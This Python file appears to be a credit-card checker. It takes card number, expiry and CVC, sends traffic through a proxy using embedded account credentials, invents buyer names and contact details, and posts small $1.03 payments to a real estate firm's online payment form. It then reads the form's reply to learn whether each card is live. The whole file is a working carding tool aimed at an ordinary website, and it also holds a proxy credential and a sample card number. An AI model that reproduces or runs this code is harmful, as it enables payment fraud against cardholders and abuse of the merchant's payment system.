import random
import string
import requests
from user_agent import generate_user_agent
from proxy import reqproxy, make_request
import json
import re

#============================================
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
    
    city = random.choice(cities)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = random.choice(zip_codes)
    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"

def generate_email():
    return f"user{random.randint(10000,99999)}@example.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_random_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

#============================================
def Tele(ccx):
    proxy_str = "brd.superproxy.io:33335:brd-customer-hl_5c664e64-zone-datacenter_proxy1:0bnfn02i83lj"
    session, ip = reqproxy(proxy_str)
    #print(f"IP Address: {ip}")
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:#Mo3gza
        yy = yy.split("20")[1]
    elif "01" in mm or "02" in mm or "01" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
        mm = mm.split("0")[1]

    user = generate_user_agent()
    r = requests.Session()
    r.verify = False
    
    first_name, last_name = generate_full_name()
    kaddress, city, country, postcode, phone =     generate_address()
    kaddress, city, country, postcode, phone = generate_address()
    email = generate_email()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    nr = random.randint(100000, 999999)
    lr = random.randint(1000, 9999)
    
    headers = {
        'authority': 'td-realty.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'referer': 'https://www.google.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    response = session.get('https://td-realty.com/make-payment/', headers=headers)
    
    state = re.search(r"name='state_1' value='(.*?)'", response.text).group(1)
    #print(state)
    
    cookies = {
        '_tccl_visitor': '71862639-94c2-4599-b15f-cc203448a505',
        '_tccl_visit': '71862639-94c2-4599-b15f-cc203448a505',
        '_scc_session': 'pc=3&C_TOUCH=2026-04-25T05:20:25.549Z',
    }
    
    headers = {
        'authority': 'td-realty.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryFdtsjlzwBXe5hWug',
        # 'cookie': '_tccl_visitor=71862639-94c2-4599-b15f-cc203448a505; _tccl_visit=71862639-94c2-4599-b15f-cc203448a505; _scc_session=pc=3&C_TOUCH=2026-04-25T05:20:25.549Z',
        'origin': 'https://td-realty.com',
        'referer': 'https://td-realty.com/make-payment/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'iframe',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    files = [
        ('input_3', (None, 'Fab-shop Bldg                                    -   10081 Tyler Place, Ijamsville, MD  21754')),
        ('input_4.3', (None, f'{first_name}')),
        ('input_4.6', (None, f'{last_name}')),
        ('input_10', (None, f'(430) 300-{lr}')),
        ('input_11', (None, f'yellhtetgaung{nr}@gmail.com')),
        ('input_7', (None, '$1.00')),
        ('input_18.1', (None, 'Transaction Fee (3%)')),
        ('input_18.2', (None, '$0.03')),
        ('input_18.3', (None, '1')),
        ('input_13', (None, 'Rent')),
        ('input_14', (None, '')),
        ('input_15', (None, '')),
        ('input_8', (None, '1.03')),
        ('input_9.1', (None, f'{n}')),
        ('input_9.2[]', (None, f'{mm}')),
        ('input_9.2[]', (None, f'20{yy}')),
        ('input_9.3', (None, f'{cvc}')),
        ('input_9.5', (None, f'{first_name} {last_name}')),
        ('gform_ajax', (None, 'form_id=1&title=&description=1&tabindex=1')),
        ('is_submit_1', (None, '1')),
        ('gform_submit', (None, '1')),
        ('gform_unique_id', (None, '')),
        ('state_1', (None, f'{state}')),
        ('gform_target_page_number_1', (None, '0')),
        ('gform_source_page_number_1', (None, '3')),
        ('gform_field_values', (None, '')),
    ]
    
    response = session.post('https://td-realty.com/make-payment/', #cookies=cookies, 
    headers=headers, files=files)
    
    try:
        result = re.search(r"class='gfield_description validation_message' aria-live='polite'><!-- (.*?)<\/div><\/li>", response.text).group(1)
    except:
        result = re.search(r"id='gform_confirmation_message_1' class='gform_confirmation_message_1 gform_confirmation_message'>(.*?)<\/div><\/div><\/body>", response.text).group(1)
    return result
    
#test_card = "4744722125678468|09|27|542"
#print(Tele(test_card))